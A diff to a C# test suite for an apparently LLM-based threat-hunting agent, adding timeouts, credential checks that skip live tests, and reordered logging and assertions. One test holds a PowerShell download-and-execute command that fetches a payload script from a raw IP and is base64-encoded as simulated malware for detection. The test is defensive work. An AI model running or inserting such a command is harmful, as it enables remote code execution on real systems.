@@ -334,10 +334,11 @@ public class AutonomousHunterAgentTests
         Assert.True(result.Elapsed.TotalSeconds < 3.0);
     }
 
-    [Fact]
+    [Fact(Timeout = 60000)]
     [Trait("Category", "Live")]
     public async Task TestLiveAutonomousInvestigationWithLocalCredentials()
     {
+        _output.WriteLine("[테스트 시작] TestLiveAutonomousInvestigationWithLocalCredentials");
         var treeManager = new ProcessTreeProjectionManager();
         var archiveManager = ForensicArchiveManager.CreateInMemory();
         var tools = new IInvestigationTool[]
@@ -351,6 +352,12 @@ public class AutonomousHunterAgentTests
 
         // Phalanx 로컬 인증정보(Config/google-credentials.json 또는 AppSettings.json)로 실제 Vertex AI Gemini 클라이언트 자동 연결
         var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+
+        if (!agent.IsOnlineGemini)
+        {
+            _output.WriteLine("[안내] 유효한 Gemini/Vertex AI 인증정보가 감지되지 않아 Live 테스트를 건너뜁니다. (오프라인 모드 유지)");
+            return;
+        }
 
         string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
         string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
@@ -381,21 +388,23 @@ public class AutonomousHunterAgentTests
 
         var dispatchedCommands = new List<MitigationCommand>();
 
-        // 실행: 실제 구글 클라우드로 요청을 보내서 실시간 추론 진행!
-        var result = await agent.InvestigateAsync(targetNode, cmd =>
+        InvestigationResult result;
+        try
         {
-            dispatchedCommands.Add(cmd);
-            return Task.CompletedTask;
-        });
+            // 실행: 실제 구글 클라우드로 요청을 보내서 실시간 추론 진행!
+            result = await agent.InvestigateAsync(targetNode, cmd =>
+            {
+                dispatchedCommands.Add(cmd);
+                return Task.CompletedTask;
+            });
+        }
+        catch (Exception ex)
+        {
+            _output.WriteLine($"[수사 중 예외 발생] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}");
+            throw;
+        }
 
-        // 결과 검증
-        Assert.NotNull(result);
-        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
-        Assert.Contains(dispatchedCommands, c => c.Action == MitigationCommand.Types.ActionType.ActionExtendTimeout);
-        Assert.False(string.IsNullOrWhiteSpace(result.Narrative));
-        Assert.False(string.IsNullOrWhiteSpace(result.SummaryTitle));
-        Assert.True(result.Traces.Count >= 2, $"멀티턴 단계 부족: {result.Traces.Count}");
-
+        // 결과 사전 로깅 (Assertion 실패 전에도 전체 결과 및 Trace가 출력되도록 보장)
         _output.WriteLine($"[LIVE VERDICT] {result.VerdictAction} (Confidence: {result.Confidence:P1})");
         _output.WriteLine($"[TITLE] {result.SummaryTitle}");
         _output.WriteLine($"[ELAPSED] {result.Elapsed.TotalMilliseconds:F1}ms");
@@ -407,6 +416,14 @@ public class AutonomousHunterAgentTests
             _output.WriteLine($"  Args: {trace.ActionArgsJson}");
             _output.WriteLine($"  Observation: {trace.Observation}");
         }
+
+        // 결과 검증
+        Assert.NotNull(result);
+        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
+        Assert.Contains(dispatchedCommands, c => c.Action == MitigationCommand.Types.ActionType.ActionExtendTimeout);
+        Assert.False(string.IsNullOrWhiteSpace(result.Narrative));
+        Assert.False(string.IsNullOrWhiteSpace(result.SummaryTitle));
+        Assert.True(result.Traces.Count >= 2, $"멀티턴 단계 부족: {result.Traces.Count}");
 
         var auditPayload = new
         {
@@ -482,7 +499,7 @@ public class AutonomousHunterAgentTests
         Assert.Contains("{ nested: true", decision.Thought);
     }
 
-    [Fact]
+    [Fact(Timeout = 300000)]
     [Trait("Category", "Live")]
     public async Task TestLive_MultiScenario_AverageTurnAndLatencyBenchmark()
     {
@@ -498,6 +515,12 @@ public class AutonomousHunterAgentTests
         };
 
         var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+
+        if (!agent.IsOnlineGemini)
+        {
+            _output.WriteLine("[안내] 유효한 Gemini/Vertex AI 인증정보가 감지되지 않아 10대 시나리오 실측 벤치마크를 건너뜁니다.");
+            return;
+        }
 
         // 10대 실무 시나리오 구성 (악성 공격 6종 vs 정상 업무 4종)
         var scenarios = new (string Name, string ParentImage, uint ParentPid, string TargetImage, uint TargetPid, string CommandLine, ActionType ExpectedAction)[]
@@ -805,7 +828,7 @@ public class AutonomousHunterAgentTests
     /// 미등록 외부 IP(위협점수 45점, 단독 사살 불가) + Temp 디렉터리 내 svchost.exe 위장(Masquerading) + 인라인 다운로더 복합 시나리오.
     /// 에이전트가 단독 IP 평판만으로 조기 종료하지 못하고 3턴 이상의 심층 수사를 전개하는지 및 도구 결합성을 실측 검증.
     /// </summary>
-    [Fact]
+    [Fact(Timeout = 60000)]
     [Trait("Category", "Live")]
     public async Task TestLive_ConvolutedEvasiveAttack_MultiTurnAnalysis()
     {
@@ -821,6 +844,12 @@ public class AutonomousHunterAgentTests
         };
 
         var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+
+        if (!agent.IsOnlineGemini)
+        {
+            _output.WriteLine("[안내] 유효한 Gemini/Vertex AI 인증정보가 감지되지 않아 Live 다단계 수사 테스트를 건너뜁니다.");
+            return;
+        }
 
         // 부모: explorer.exe (정상 윈도우 셸)
         treeManager.ApplySnapshotBatch(new[]
